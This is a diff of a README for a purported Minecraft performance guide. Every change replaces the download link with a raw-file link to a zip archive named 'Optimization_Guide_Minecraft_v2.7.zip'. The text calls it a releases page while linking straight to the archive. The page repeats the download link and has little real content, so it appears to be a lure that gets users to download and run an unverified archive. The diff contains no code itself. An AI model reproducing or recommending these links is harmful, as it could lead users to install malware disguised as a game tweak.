@@ -1,6 +1,6 @@
 # 🛠️ Minecraft-Optimization-Guide - Improve Your Minecraft Performance Easily
 
-[![Download Now](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip)
+[![Download Now](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Optimization_Guide_Minecraft_v2.7.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Optimization_Guide_Minecraft_v2.7.zip)
 
 ## 📄 Introduction
 
@@ -12,7 +12,7 @@ To start your journey towards better Minecraft performance, follow these straigh
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page**: To download the Minecraft Optimization Guide, [visit this page to download](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip).
+1. **Visit the Releases Page**: To download the Minecraft Optimization Guide, [visit this page to download](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Optimization_Guide_Minecraft_v2.7.zip).
    
 2. **Choose Your Version**: On the releases page, you will find several versions available. Each version contains updates and enhancements. 
 
@@ -60,4 +60,4 @@ This guide aims to empower you to enjoy Minecraft without performance issues. By
 Remember to check back for updates and new tips as the Minecraft landscape evolves!
 
 ### 🖱️ Important Links
-For easy access, here’s the download link again: [Visit this page to download](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Minecraft-Optimization-Guide.zip).
+For easy access, here’s the download link again: [Visit this page to download](https://raw.githubusercontent.com/V369web10/Minecraft-Optimization-Guide/main/scribble/Optimization_Guide_Minecraft_v2.7.zip).
